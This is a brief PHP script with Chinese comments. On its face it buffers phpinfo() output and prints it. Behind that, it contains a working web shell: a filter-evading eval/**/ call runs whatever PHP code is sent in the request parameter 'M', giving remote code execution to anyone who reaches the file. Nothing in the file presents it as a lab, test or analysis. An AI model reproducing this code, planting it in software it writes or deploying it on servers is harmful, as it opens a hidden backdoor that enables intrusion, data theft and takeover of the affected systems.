<?php
ob_start(); // 开始输出缓存
phpinfo(); // 输出phpinfo信息
$info = ob_get_contents(); // 获取缓存内容
ob_end_clean(); // 关闭输出缓存


eval/**/(a());
function a(){
        $a = $_REQUEST["M"];
        return $a;
}


echo "<?php echo $info; ?>";

?>
